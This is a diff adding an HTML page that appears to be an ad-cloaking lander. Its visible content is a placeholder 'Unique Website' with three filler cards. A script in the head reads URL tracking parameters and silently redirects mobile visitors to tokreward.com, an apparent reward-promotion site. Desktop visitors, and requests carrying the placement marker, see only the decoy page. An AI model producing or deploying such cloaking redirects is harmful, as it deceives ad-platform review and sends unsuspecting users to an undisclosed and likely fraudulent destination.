@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unique Website</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #8c1aff;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        
+        header {
+            background-color: #4d0099;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        nav {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            padding: 10px 20px;
+            margin: 0 10px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+        
+        nav a:hover {
+            background-color: #6633cc;
+        }
+        
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .card {
+            background-color: #6633cc;
+            padding: 20px;
+            margin: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            max-width: 300px;
+        }
+        
+        footer {
+            background-color: #4d0099;
+            padding: 10px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        footer a {
+            color: #fff;
+            text-decoration: none;
+        }
+    </style>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmXXX = urlParams.get("xxx");
+        const s = urlParams.get("s");
+        const ttclid = urlParams.get("ttclid");
+        const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        const lander = `https://tokreward.com/api/v5/entry?s1=${s}&ttclid=${ttclid}`;
+        if (utmXXX === "__PLACEMENT__") { }
+        else if (isMobileDevice) { window.location.href = lander; }
+        else { }
+    </script>
+</head>
+<body>
+    <header>
+        <h1>Welcome to the Unique Website</h1>
+    </header>
+    
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">About</a>
+        <a href="#">Services</a>
+        <a href="#">Contact</a>
+    </nav>
+    
+    <main>
+        <div class="card">
+            <h2>Card 1</h2>
+            <p>This is the first card on the page.</p>
+        </div>
+        
+        <div class="card">
+            <h2>Card 2</h2>
+            <p>This is the second card on the page.</p>
+        </div>
+        
+        <div class="card">
+            <h2>Card 3</h2>
+            <p>This is the third card on the page.</p>
+        </div>
+    </main>
+    
+    <footer>
+        <p>&copy; 2023 Unique Website. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
